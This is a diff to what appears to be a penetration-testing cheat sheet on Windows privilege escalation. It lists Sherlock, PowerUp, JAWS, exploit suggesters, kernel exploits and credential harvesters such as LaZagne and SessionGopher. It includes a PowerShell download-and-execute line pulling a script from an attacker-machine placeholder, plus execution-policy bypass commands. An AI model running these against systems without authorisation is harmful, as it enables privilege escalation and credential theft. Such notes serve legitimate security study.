@@ -88,27 +88,62 @@
 
 #### PowerShell
 
-- [Sherlock.ps1](https://github.com/rasta-mouse/Sherlock) is a powershell script that will give exploit related to the target.  
+##### Sherlock
+
+[Sherlock.ps1](https://github.com/rasta-mouse/Sherlock) is a powershell script that will give exploit related to the target.  
   It can also be found here on kali if empire is installed `/usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1`
-  - We can launch it with cmd like this (has to be served through an http server from the attacking machine)  
+- We can launch it with cmd like this (has to be served through an http server from the attacking machine)  
   `echo IEX(New-Object Net.WebClient).DownloadString('http://ATTACK-MACHINE-IP/Sherlock.ps1') | powershell -noprofile -`
-- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) is a powershell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found.
-- [JAWS](https://github.com/411Hall/JAWS) is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.
+- Launch from Powershell
+
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy bypass -Scope CurrentUser
+Import-module -Name C:\Absolute\Path\to\Sherlock.ps1
+Find-AllVulns
+```
+
+##### PowerUp
+
+[PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) is a powershell script for finding common Windows privilege escalation vectors that rely on misconfigurations. It can also be used to exploit some of the issues found.
+
+```powershell
+Set-ExecutionPolicy -ExecutionPolicy bypass -Scope CurrentUser
+Import-module -Name C:\Absolute\Path\to\PowerUp.ps1
+Invoke-AllChecks
+```
+
+##### JAWS
+
+[JAWS](https://github.com/411Hall/JAWS) is PowerShell script designed to help penetration testers (and CTFers) quickly identify potential privilege escalation vectors on Windows systems. It is written using PowerShell 2.0 so 'should' run on every Windows version since Windows 7.
 
 #### Other
 
-- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) is a python script that will provide the list of vulnerabilities the OS is vulnerable to using systeminfo
-  - [Here](https://www.jaacostan.com/2021/04/windows-exploit-suggester-next.html) is a blog post about wes next generation
-- [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
+##### Exploit Suggesters
+
+[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) is a python script that will provide the list of vulnerabilities the OS is vulnerable to using systeminfo  
+[Here](https://www.jaacostan.com/2021/04/windows-exploit-suggester-next.html) is a blog post about wes next generation  
+[Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)
+
+##### Precompiled kernel exploits
+
 - [Precompiled kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)
+
+##### SessionGopher
+
 - [SessionGopher](https://github.com/Arvanaghi/SessionGopher) is a PowerShell tool that finds and decrypts saved session information for remote access tools. It extracts PuTTY, WinSCP, SuperPuTTY, FileZilla, and RDP saved session information.
+
+##### LaZagne
+
 - [LaZagne](https://github.com/AlessandroZ/LaZagne) is a tool used for retrieving passwords stored on a local machine from web browsers, chat tools, databases, Git, email, memory dumps, PHP, sysadmin tools, wireless network configurations, internal Windows password storage mechanisms, and more
+
+##### Sysinternals Suite
+
 - [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) is a suite of tools that is used to monitor, manage and troubleshoot the Windows operating system owned by Microsoft. It is really useful for enumeration.
 - [Security Update Guide](https://msrc.microsoft.com/update-guide/vulnerability)
 
 #### Pre-compiled binaries. 
 
-It can be usefule to have precompiled binaries just ready to run
+It can be useful to have precompiled binaries just ready to run
 - [GhostPack-Compiled Binaries - harmj0y](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
 - [LaZagne releases](https://github.com/AlessandroZ/LaZagne/releases/)
 
